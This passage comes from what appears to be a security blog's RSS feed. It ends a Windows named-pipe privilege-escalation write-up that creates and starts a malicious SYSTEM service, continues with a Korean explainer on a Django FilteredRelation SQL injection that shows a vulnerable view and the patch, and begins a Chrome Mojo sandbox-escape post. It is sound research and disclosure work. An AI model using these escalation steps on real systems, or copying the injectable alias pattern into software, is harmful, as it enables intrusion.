class="hljs-number">0x10018</span>u, &amp;written, <span class="hljs-number">0</span>);  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;}</code></pre><p>Now it executes StartServiceW() in the case 0x1040 branch that starts the created service.</p><ul><li>input + 8 &#x2192; <code>hService</code> (<code>SC_HANDLE</code>)</li><li>dwNumServiceArgs &#x2192; <code>0</code> (fixed)</li><li>lpServiceArgVectors &#x2192; <code>NULL</code> (fixed)</li></ul><p>You just need to put the handle received as the return value of CreateServiceW() into input + 8 and execute it!</p><p>This time too, shall we verify step by step first with dynamic analysis?</p><p><img src="/2026/01/18/gongjae/WHS3-bughunting2/EN/image25.png" alt></p><p>First, let&#x2019;s set a bp near the OpenSCManagerW() function and check.</p><p><img src="/2026/01/18/gongjae/WHS3-bughunting2/EN/image26.png" alt></p><p>You can confirm that the SC_MANAGER_ALL_ACCESS(0xf003f) that we inserted is in the dwDesiredAccess part!</p><p><img src="/2026/01/18/gongjae/WHS3-bughunting2/EN/image27.png" alt></p><p>After that, if you look at the output screen, you can confirm that it properly receives the hSCM handle.</p><p><img src="/2026/01/18/gongjae/WHS3-bughunting2/EN/image28.png" alt></p><p>Now, let&#x2019;s set a bp near CreateServiceW() and check.</p><p><img src="/2026/01/18/gongjae/WHS3-bughunting2/EN/image29.png" alt></p><p>I wrote System in lpServiceStartName.</p><p><img src="/2026/01/18/gongjae/WHS3-bughunting2/EN/image30.png" alt></p><p>And lpBinaryPathName has the malicious file path that we will register as a service.</p><p><img src="/2026/01/18/gongjae/WHS3-bughunting2/EN/image31.png" alt></p><p>If you look at the output routine after that, you can see that the service is created and you can also get the service handle value.</p><p><img src="/2026/01/18/gongjae/WHS3-bughunting2/EN/image32.png" alt></p><p><img src="/2026/01/18/gongjae/WHS3-bughunting2/EN/image33.png" alt></p><p>If you check the service, you can see that the LPE service was created and the path is also set to the malicious file path.</p><p>Now, if you only execute it via StartServiceW()? The malicious service will run with SYSTEM privileges!!</p><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><hr><p><img src="/2026/01/18/gongjae/WHS3-bughunting2/EN/image34.png" alt></p><p>I hope the explanation of multiple LPE vectors of the Named Pipe vulnerability in this Part 2 helped you!! That due to the permission setting of Named Pipe, there can be a situation where a medium user can act with SYSTEM privileges! As I wrote, I think I wrote it like a very heavy &#x201C;gobongbap&#x201D; and failed at controlling the length&#x2026; but!! I&#x2019;d appreciate it if you read it thinking &#x201C;Wow, LPE is possible in this way too!!&#x201D; &#x1F609; Next time, I will come back with a vulnerability in a Kernel Driver, which is the flower of Windows LPE~ Thank you!</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://learn.microsoft.com/ko-kr/windows/win32/api/winsvc/nf-winsvc-openscmanagerw">https://learn.microsoft.com/ko-kr/windows/win32/api/winsvc/nf-winsvc-openscmanagerw</a></li><li><a href="https://learn.microsoft.com/ko-kr/windows/win32/services/service-security-and-access-rights">https://learn.microsoft.com/ko-kr/windows/win32/services/service-security-and-access-rights</a></li><li><a href="https://learn.microsoft.com/ko-kr/windows/win32/api/winsvc/nf-winsvc-createservicew">https://learn.microsoft.com/ko-kr/windows/win32/api/winsvc/nf-winsvc-createservicew</a></li><li><a href="https://learn.microsoft.com/ko-kr/windows/win32/api/winsvc/nf-winsvc-startservicew">https://learn.microsoft.com/ko-kr/windows/win32/api/winsvc/nf-winsvc-startservicew</a></li><li><a href="https://learn.microsoft.com/ko-kr/windows/win32/api/shlwapi/nf-shlwapi-shsetvaluew">https://learn.microsoft.com/ko-kr/windows/win32/api/shlwapi/nf-shlwapi-shsetvaluew</a></li><li><a href="https://learn.microsoft.com/ko-kr/windows/win32/api/winbase/nf-winbase-copyfilew">https://learn.microsoft.com/ko-kr/windows/win32/api/winbase/nf-winbase-copyfilew</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/LPE/">LPE</category>
      
      <category domain="https://hackyboiz.github.io/tags/Windows/">Windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/BugHunting/">BugHunting</category>
      
      <category domain="https://hackyboiz.github.io/tags/KernelDriver/">KernelDriver</category>
      
      <category domain="https://hackyboiz.github.io/tags/NamedPipe/">NamedPipe</category>
      
      
      <comments>https://hackyboiz.github.io/2026/01/18/gongjae/WHS3-bughunting2/EN/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-57833: Django ORM에서 발생한 SQL Injection 취약점</title>
      <link>https://hackyboiz.github.io/2026/01/17/millet/cve-2025-57833/</link>
      <guid>https://hackyboiz.github.io/2026/01/17/millet/cve-2025-57833/</guid>
      <pubDate>Sat, 17 Jan 2026 12:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://zeropath.com/blog/cve-2025-57833-django-fil</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://zeropath.com/blog/cve-2025-57833-django-filteredrelation-sql-injection">https://zeropath.com/blog/cve-2025-57833-django-filteredrelation-sql-injection</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Django &lt; 4.2.24</li><li>Django &lt; 5.1.12</li><li>Django &lt; 5.2.6</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><h3 id="background"><a href="#background" class="headerlink" title="background"></a>background</h3><p>Python &#xAE30;&#xBC18; &#xC6F9; &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C;&#xC778; Django&#xC5D0;&#xC11C;&#xB294; &#xB370;&#xC774;&#xD130;&#xBCA0;&#xC774;&#xC2A4;&#xC640;&#xC758; &#xCFFC;&#xB9AC;&#xB97C; &#xC704;&#xD55C; ORM(Object-Relational Mapping) &#xAE30;&#xB2A5;&#xC774; &#xC81C;&#xACF5;&#xB429;&#xB2C8;&#xB2E4;. ORM&#xC744; &#xC774;&#xC6A9;&#xD558;&#xBA74; &#xAC1C;&#xBC1C;&#xC790;&#xAC00; &#xC9C1;&#xC811; SQL&#xC744; &#xC791;&#xC131;&#xD558;&#xC9C0; &#xC54A;&#xACE0;&#xB3C4; <code>QuerySet</code> API&#xB97C; &#xD1B5;&#xD574; &#xB370;&#xC774;&#xD130; &#xC870;&#xD68C;, &#xC0BD;&#xC785;, &#xAC31;&#xC2E0; &#xB4F1;&#xC758; &#xC5F0;&#xC0B0;&#xC744; &#xCD94;&#xC0C1;&#xD654; &#xACC4;&#xCE35;&#xC744; &#xD1B5;&#xD574; &#xC218;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>Django ORM&#xC758; &#xCFFC;&#xB9AC; &#xCC98;&#xB9AC; &#xACFC;&#xC815;&#xC740; &#xB0B4;&#xBD80;&#xC801;&#xC73C;&#xB85C; <code>QuerySet</code>&#xC5D0; &#xC800;&#xC7A5;&#xB41C; &#xC870;&#xAC74;, &#xC815;&#xB82C;, &#xC870;&#xC778; &#xC815;&#xBCF4; &#xB4F1;&#xC744; &#xAE30;&#xBC18;&#xC73C;&#xB85C; SQLCompiler&#xAC00; SQL &#xD15C;&#xD50C;&#xB9BF;&#xC744; &#xC0DD;&#xC131;&#xD558;&#xACE0; &#xC774;&#xD6C4; &#xB370;&#xC774;&#xD130;&#xBCA0;&#xC774;&#xC2A4; &#xCEE4;&#xB125;&#xD130;&#xB97C; &#xD1B5;&#xD574; &#xCD5C;&#xC885; SQL &#xAD6C;&#xBB38;&#xC774; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xAD6C;&#xC870;&#xB85C; &#xC774;&#xB8E8;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;. &#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; ORM&#xC740; &#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; <strong>&#xD30C;&#xB77C;&#xBBF8;&#xD130; &#xBC14;&#xC778;&#xB529;(Parameter Binding)</strong> &#xBC29;&#xC2DD;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xC0AC;&#xC6A9;&#xC790; &#xC785;&#xB825;&#xAC12;&#xC744; &#xCFFC;&#xB9AC; &#xBB38;&#xC790;&#xC5F4;&#xACFC; &#xBD84;&#xB9AC;&#xD558;&#xC5EC; &#xCC98;&#xB9AC;&#xD568;&#xC73C;&#xB85C;&#xC368; SQL &#xC778;&#xC81D;&#xC158;&#xC744; &#xBC29;&#xC9C0;&#xD569;&#xB2C8;&#xB2E4;.</p><blockquote><p><strong>&#xD30C;&#xB77C;&#xBBF8;&#xD130; &#xBC14;&#xC778;&#xB529;&#xC758; &#xAD6C;&#xD604; &#xC608;&#xC2DC;</strong></p></blockquote><pre><code class="hljs python">sql = <span class="hljs-string">&apos;SELECT * FROM user WHERE username = %s&apos;</span>cursor.execute(sql, [username])</code></pre><p>&#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; &#xD30C;&#xB77C;&#xBBF8;&#xD130; &#xBC14;&#xC778;&#xB529;&#xC5D0;&#xC11C;&#xB294; &#xCEEC;&#xB7FC;&#xBA85;, &#xD14C;&#xC774;&#xBE14;&#xBA85;, <code>JOIN</code> alias, annotation alias &#xB4F1; SQL &#xC2DD;&#xBCC4;&#xC790;&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; &#xAC12;&#xC5D0;&#xB294; &#xC801;&#xC6A9;&#xB418;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. Django ORM &#xC5ED;&#xC2DC; &#xB370;&#xC774;&#xD130; &#xAC12;&#xC5D0; &#xB300;&#xD574;&#xC11C;&#xB9CC; &#xD30C;&#xB77C;&#xBBF8;&#xD130; &#xBC14;&#xC778;&#xB529;&#xC744; &#xC218;&#xD589;&#xD558;&#xBA70; &#xC2DD;&#xBCC4;&#xC790;&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xB294; SQL &#xD15C;&#xD50C;&#xB9BF; &#xC790;&#xCCB4;&#xB294; ORM &#xB808;&#xBCA8;&#xC5D0;&#xC11C; &#xC9C1;&#xC811; &#xBB38;&#xC790;&#xC5F4;&#xB85C; &#xC0DD;&#xC131;&#xB429;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xC2DD;&#xBCC4;&#xC790;&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; &#xAC12;&#xC740; &#xD30C;&#xB77C;&#xBBF8;&#xD130; &#xBC14;&#xC778;&#xB529;&#xC73C;&#xB85C; &#xBCF4;&#xD638;&#xB418;&#xC9C0; &#xC54A;&#xC73C;&#xBA70; &#xAC80;&#xC99D;&#xC774; &#xBD80;&#xC871;&#xD560; &#xACBD;&#xC6B0; SQL &#xC778;&#xC81D;&#xC158;&#xC73C;&#xB85C; &#xC774;&#xC5B4;&#xC9C0;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; QuerySet&#xC758; <code>annotate()</code> &#xBA54;&#xC11C;&#xB4DC;&#xC640; &#xD568;&#xAED8; &#xC0AC;&#xC6A9;&#xB418;&#xB294; <code>FilteredRelation</code>&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;. <code>annotate()</code>&#xB294; &#xCFFC;&#xB9AC; &#xACB0;&#xACFC;&#xC758; &#xAC01; &#xD589;&#xC5D0; &#xB300;&#xD574; &#xACC4;&#xC0B0;&#xB41C; &#xAC12;&#xC744; &#xCD94;&#xAC00;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC0AC;&#xC6A9;&#xB418;&#xBA70; &#xBAA8;&#xB378; &#xD544;&#xB4DC;&#xB85C; &#xC800;&#xC7A5;&#xD560; &#xD544;&#xC694;&#xB294; &#xC5C6;&#xC9C0;&#xB9CC; &#xC870;&#xD68C; &#xC2DC; &#xB3D9;&#xC801;&#xC73C;&#xB85C; &#xD544;&#xC694;&#xD55C; &#xAC12;&#xC744; &#xACC4;&#xC0B0;&#xD560; &#xB54C; &#xD65C;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C;, &#xC778;&#xC790;&#xB294; <code>{alias : value}</code>&#xC640; &#xAC19;&#xC740; &#xD0A4; &#xD615;&#xD0DC;&#xB85C; &#xC804;&#xB2EC;&#xB418;&#xBA70; alias&#xB294; SQL &#xC0C1;&#xC5D0;&#xC11C; &#xCEEC;&#xB7FC; &#xB610;&#xB294; &#xC870;&#xC778; &#xBCC4;&#xCE6D;&#xC73C;&#xB85C; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</p><blockquote><p><strong><code>annotate()</code> &#xC0AC;&#xC6A9; &#xC608;&#xC2DC;</strong></p></blockquote><pre><code class="hljs python"><span class="hljs-keyword">from</span> django.db.models <span class="hljs-keyword">import</span> Countqs = User.objects.annotate(login_cnt=Count(<span class="hljs-string">&quot;loginlog&quot;</span>))</code></pre><pre><code class="hljs sql"><span class="hljs-comment"># &#xC0DD;&#xC131;&#xB418;&#xB294; SQL &#xC608;&#xC2DC;</span><span class="hljs-keyword">SELECT</span><span class="hljs-string">&quot;user&quot;</span>.<span class="hljs-string">&quot;id&quot;</span>,<span class="hljs-keyword">COUNT</span>(<span class="hljs-string">&quot;loginlog&quot;</span>.<span class="hljs-string">&quot;id&quot;</span>) <span class="hljs-keyword">AS</span> <span class="hljs-string">&quot;login_cnt&quot;</span><span class="hljs-keyword">FROM</span> <span class="hljs-string">&quot;user&quot;</span><span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">OUTER</span> <span class="hljs-keyword">JOIN</span> <span class="hljs-string">&quot;loginlog&quot;</span><span class="hljs-keyword">ON</span> (<span class="hljs-string">&quot;loginlog&quot;</span>.<span class="hljs-string">&quot;user_id&quot;</span> = <span class="hljs-string">&quot;user&quot;</span>.<span class="hljs-string">&quot;id&quot;</span>)<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> <span class="hljs-string">&quot;user&quot;</span>.<span class="hljs-string">&quot;id&quot;</span>;</code></pre><p><code>FilteredRelation</code>&#xC740; <code>JOIN</code> &#xC218;&#xD589; &#xC2DC; <code>ON</code> &#xC808;&#xC5D0; &#xC870;&#xAC74;&#xC744; &#xCD94;&#xAC00;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC81C;&#xACF5;&#xB418;&#xB294; &#xAC1D;&#xCCB4;&#xC785;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xAE30;&#xB2A5;&#xC740; <code>JOIN</code> &#xB300;&#xC0C1; &#xD14C;&#xC774;&#xBE14;&#xC758; alias&#xC640; <code>ON</code> &#xC870;&#xAC74;&#xC744; ORM &#xB0B4;&#xBD80;&#xC5D0;&#xC11C; &#xC9C1;&#xC811; &#xAD6C;&#xC131;&#xD55C;&#xB2E4;&#xB294; &#xD2B9;&#xC9D5;&#xC744; &#xAC00;&#xC9D1;&#xB2C8;&#xB2E4;. &#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; alias &#xBC0F; &#xC870;&#xAC74;&#xC5D0; &#xB300;&#xD55C; &#xAC80;&#xC99D;&#xC774; &#xCDA9;&#xBD84;&#xD558;&#xC9C0; &#xC54A;&#xC744; &#xACBD;&#xC6B0;, &#xAC1C;&#xBC1C;&#xC790;&#xB098; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC785;&#xB825;&#xD55C; &#xAC12;&#xC774; &#xCD5C;&#xC885;&#xC801;&#xC778; Raw SQL&#xC5D0; &#xADF8;&#xB300;&#xB85C; &#xD3EC;&#xD568;&#xB420; &#xC218; &#xC788;&#xB2E4;&#xB294; &#xAC00;&#xB2A5;&#xC131;&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p><blockquote><p><strong>&#xCDE8;&#xC57D;&#xD55C; &#xCF54;&#xB4DC; &#xD328;&#xD134;: &#xBE0C;&#xB77C;&#xC6B0;&#xC800;&#xC5D0;&#xC11C; &#xC804;&#xB2EC;&#xB41C; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB97C; &#xADF8;&#xB300;&#xB85C; alias&#xC5D0; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xCF54;&#xB4DC;</strong></p></blockquote><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">search</span>(<span class="hljs-params">request</span>):</span>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&apos;POST&apos;</span>:        <span class="hljs-keyword">try</span>:            data = json.loads(request.body)            search_field = data.get(<span class="hljs-string">&apos;search_field&apos;</span>)            condition = FILTER_MAP.get(search_field, Q(id__gte=<span class="hljs-number">0</span>))                        queryset = (                 Book.objects.annotate(**{                    search_field: FilteredRelation(                        <span class="hljs-string">&apos;author&apos;</span>,                         condition=condition), <span class="hljs-comment"># vuln</span>                })                .filter(**{<span class="hljs-string">f&apos;<span class="hljs-subst">{search_field}</span>__isnull&apos;</span>: <span class="hljs-literal">False</span>})             )</code></pre><h3 id="Root-Cause"><a href="#Root-Cause" class="headerlink" title="Root Cause"></a>Root Cause</h3><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC785;&#xB825;&#xD55C; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xADF8;&#xB300;&#xB85C; <code>FilteredRelation</code>&#xC758; alias&#xB85C; &#xC0AC;&#xC6A9;&#xD560; &#xB54C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. Django ORM &#xACC4;&#xCE35;&#xC5D0;&#xC11C; <code>FilteredRelation</code>&#xC774; &#xC0AC;&#xC6A9;&#xB420; &#xB54C; <code>annotate()</code> &#xB0B4;&#xBD80;&#xC5D0;&#xC11C; &#xD638;&#xCD9C;&#xB418;&#xB294; &#xACBD;&#xC6B0;&#xC5D0;&#xB9CC; alias&#xC5D0; &#xB300;&#xD55C; &#xAC80;&#xC99D;&#xC774; &#xBBF8;&#xD761;[1]&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB530;&#xB77C;&#xC11C; &#xD30C;&#xB77C;&#xBBF8;&#xD130; &#xBC14;&#xC778;&#xB529; &#xC774;&#xC804;&#xC5D0; SQL &#xD15C;&#xD50C;&#xB9BF;&#xC774; &#xC0DD;&#xC131;&#xB420; &#xB54C; &#xAC80;&#xC99D;&#xB418;&#xC9C0; &#xC54A;&#xC740; alias &#xBB38;&#xC790;&#xC5F4;&#xC774; &#xADF8;&#xB300;&#xB85C; &#xC0BD;&#xC785;[2]&#xB418;&#xC5B4; SQL &#xC778;&#xC81D;&#xC158;&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add_filtered_relation</span>(<span class="hljs-params">self, filtered_relation, alias</span>):</span>    filtered_relation.alias = alias  <span class="hljs-comment"># [1] &#xBCC4;&#xB3C4;&#xC758; &#xAC80;&#xC99D;&#xC5C6;&#xC774; &#xB0B4;&#xBD80; &#xC778;&#xC2A4;&#xD134;&#xC2A4; &#xBCC0;&#xC218;&#xB85C; &#xC0AC;&#xC6A9;</span>    relation_lookup_parts, relation_field_parts, _ = self.solve_lookup_type(        filtered_relation.relation_name    )    <span class="hljs-keyword">if</span> relation_lookup_parts:        <span class="hljs-keyword">raise</span> ValueError(            <span class="hljs-string">&quot;FilteredRelation&apos;s relation_name cannot contain lookups &quot;</span>            <span class="hljs-string">&quot;(got %r).&quot;</span> % filtered_relation.relation_name        )    <span class="hljs-keyword">for</span> lookup <span class="hljs-keyword">in</span> get_children_from_q(filtered_relation.condition):        lookup_parts, lookup_field_parts, _ = self.solve_lookup_type(lookup)        shift = <span class="hljs-number">2</span> <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> lookup_parts <span class="hljs-keyword">else</span> <span class="hljs-number">1</span>        lookup_field_path = lookup_field_parts[:-shift]        <span class="hljs-keyword">for</span> idx, lookup_field_part <span class="hljs-keyword">in</span> enumerate(lookup_field_path):            <span class="hljs-keyword">if</span> len(relation_field_parts) &gt; idx:                <span class="hljs-keyword">if</span> relation_field_parts[idx] != lookup_field_part:                    <span class="hljs-keyword">raise</span> ValueError(                        <span class="hljs-string">&quot;FilteredRelation&apos;s condition doesn&apos;t support &quot;</span>                        <span class="hljs-string">&quot;relations outside the %r (got %r).&quot;</span>                        % (filtered_relation.relation_name, lookup)                    )            <span class="hljs-keyword">else</span>:                <span class="hljs-keyword">raise</span> ValueError(                    <span class="hljs-string">&quot;FilteredRelation&apos;s condition doesn&apos;t support nested &quot;</span>                    <span class="hljs-string">&quot;relations deeper than the relation_name (got %r for &quot;</span>                    <span class="hljs-string">&quot;%r).&quot;</span> % (lookup, filtered_relation.relation_name)                )    filtered_relation.condition = rename_prefix_from_q(        filtered_relation.relation_name,        alias,        filtered_relation.condition,    )    self._filtered_relations[filtered_relation.alias] = filtered_relation <span class="hljs-comment"># [2]</span></code></pre><h3 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h3><p><a href="https://github.com/django/django/commit/4c044fcc866ec226f612c475950b690b0139d243">&#xD328;&#xCE58; &#xCEE4;&#xBC0B;</a> <code>4c044fcc866ec226f612c475950b690b0139d243</code>&#xC5D0;&#xC11C; <code>django/db/models/sql/query.py:add_filtered_relation()</code> &#xB0B4;&#xBD80;&#xC5D0; alias &#xAC80;&#xC99D; &#xB85C;&#xC9C1;&#xC744; &#xB3C4;&#xC785;&#xD558;&#xC5EC; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2026/01/17/millet/cve-2025-57833/1.png" alt></p><p>&#xCDE8;&#xC57D;&#xC810;&#xC774; &#xD328;&#xCE58;&#xB41C; &#xBC84;&#xC804;&#xC5D0;&#xC11C;&#xB294; &#xBCC4;&#xB3C4;&#xC758; alias &#xAC80;&#xC99D; &#xD568;&#xC218;&#xAC00; &#xCD94;&#xAC00;&#xB418;&#xC5B4; alias&#xAC00; SQL &#xD0A4;&#xC6CC;&#xB4DC;, &#xC608;&#xC57D;&#xC5B4;, &#xBA54;&#xD0C0; &#xBB38;&#xC790;, &#xACF5;&#xBC31;, &#xD2B9;&#xC218; &#xBB38;&#xC790;&#xB97C; &#xD3EC;&#xD568;&#xD560; &#xACBD;&#xC6B0; &#xC989;&#xC2DC; &#xC608;&#xC678;&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-57833">https://nvd.nist.gov/vuln/detail/CVE-2025-57833</a></li><li><a href="https://www.djangoproject.com/weblog/2025/sep/03/security-releases/">https://www.djangoproject.com/weblog/2025/sep/03/security-releases/</a></li><li><a href="https://medium.com/@yunusolcardev/cve-2025-57833-potential-sql-injection-via-filteredrelation-aliases-in-django-1470fccab153">https://medium.com/@yunusolcardev/cve-2025-57833-potential-sql-injection-via-filteredrelation-aliases-in-django-1470fccab153</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/SQL-Injection/">SQL Injection</category>
      
      <category domain="https://hackyboiz.github.io/tags/millet/">millet</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2025-57833/">CVE-2025-57833</category>
      
      <category domain="https://hackyboiz.github.io/tags/Django/">Django</category>
      
      <category domain="https://hackyboiz.github.io/tags/ORM/">ORM</category>
      
      
      <comments>https://hackyboiz.github.io/2026/01/17/millet/cve-2025-57833/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-2783 : Chrome의 Mojo IPC 내 핸들 검증 미흡으로 인한 샌드박스 탈출</title>
      <link>https://hackyboiz.github.io/2026/01/14/OUYA77/2026-01-14/</link>
      <guid>https://hackyboiz.github.io/2026/01/14/OUYA77/2026-01-14/</guid>
      <pubDate>Wed, 14 Jan 2026 11:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://blog.securelayer7.net/cve-2025-2783-chrome-mojo-i</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.securelayer7.net/cve-2025-2783-chrome-mojo-ipc-sandbox/">https://blog.securelayer7.net/cve-2025-2783-chrome-mojo-ipc-sandbox/</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Chrome on Windows &lt; 134.0.6998.177</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><h3 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h3><p>  &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; Kaspersky &#xC5F0;&#xAD6C;&#xC6D0;(Boris Larin, Igor Kuznetsov)&#xC774; &#xB7EC;&#xC2DC;&#xC544;&#xC758; &#xBBF8;&#xB514;&#xC5B4;, &#xAD50;&#xC721;, &#xC815;&#xBD80; &#xAE30;&#xAD00;&#xC744; &#xB300;&#xC0C1;&#xC73C;&#xB85C; &#xD55C; &#x201C;Operation ForumTroll&#x201D; &#xACF5;&#xACA9; &#xCEA0;&#xD398;&#xC778;&#xC744; &#xBD84;&#xC11D;&#xD558;&#xB358; &#xC911; &#xBC1C;&#xACAC;&#xB41C; &#xC81C;&#xB85C;&#xB370;&#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;. &#xACF5;&#xACA9;&#xC790;&#xB294; &#xD53C;&#xD574;&#xC790;&#xAC00; &#xC545;&#xC131; &#xB9C1;&#xD06C;&#xB97C; &#xD074;&#xB9AD;&#xD558;&#xB294; &#xAC83;&#xB9CC;&#xC73C;&#xB85C;(User Interaction &#xD544;&#xC694;) Chrome&#xC758; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xD658;&#xACBD;&#xC744; &#xD0C8;&#xCD9C;&#xD558;&#xC5EC; &#xD638;&#xC2A4;&#xD2B8; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xC11C; &#xC784;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xACE0; &#xC2DC;&#xC2A4;&#xD15C;&#xC744; &#xC7A5;&#xC545;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>  Chrome&#xC740; &#xBCF4;&#xC548;&#xC744; &#xC704;&#xD574; &#xAD8C;&#xD55C;&#xC774; &#xB0AE;&#xC740; Renderer Process&#xC640; &#xC2DC;&#xC2A4;&#xD15C; &#xC811;&#xADFC; &#xAD8C;&#xD55C;&#xC774; &#xC788;&#xB294; Browser Process&#xB85C; &#xB098;&#xB258;&#xC5B4; &#xC788;&#xC73C;&#xBA70;, &#xC774; &#xB458;&#xC740; Mojo IPC&#xB97C; &#xD1B5;&#xD574; &#xD1B5;&#xC2E0;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; Renderer&#xAC00; &#xC870;&#xC791;&#xB41C; IPC &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xBCF4;&#xB0B4; Broker&#xAC00; &#xC758;&#xB3C4;&#xCE58; &#xC54A;&#xC740; Windows API(<code>DuplicateHandle</code>)&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xAC8C; &#xB9CC;&#xB4DC;&#xB294; &#xAC83;&#xC774; &#xD575;&#xC2EC;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC815;&#xB9AC;&#xD558;&#xBA74; &#xACF5;&#xACA9; &#xD750;&#xB984;&#xC740; &#xC774;&#xB807;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>&#xACF5;&#xACA9;&#xC790;&#xB294; &#xC545;&#xC758;&#xC801;&#xC778; &#xD30C;&#xC77C;&#xC774;&#xB098; &#xC0AC;&#xC774;&#xD2B8;&#xB97C; &#xB9CC;&#xB4E4;&#xC5B4;&#xC11C; &#xD06C;&#xB86C; Mojo&#xC758; &#xAC00;&#xC9DC; &#xD578;&#xB4E4;&#xB85C; &#xBCF4;&#xB0C5;&#xB2C8;&#xB2E4;.</li><li>&#xC774;&#xAC8C; &#xC5F4;&#xB9AC;&#xBA74;, &#xB0AE;&#xC740; &#xAD8C;&#xD55C;&#xC758; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0;&#xC11C; &#xD578;&#xB4E4;&#xC744; &#xD1B5;&#xD574; &#xB192;&#xC740; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB85C; &#xC804;&#xB2EC;&#xB429;&#xB2C8;&#xB2E4;.</li><li>&#xD06C;&#xB86C;&#xC740; 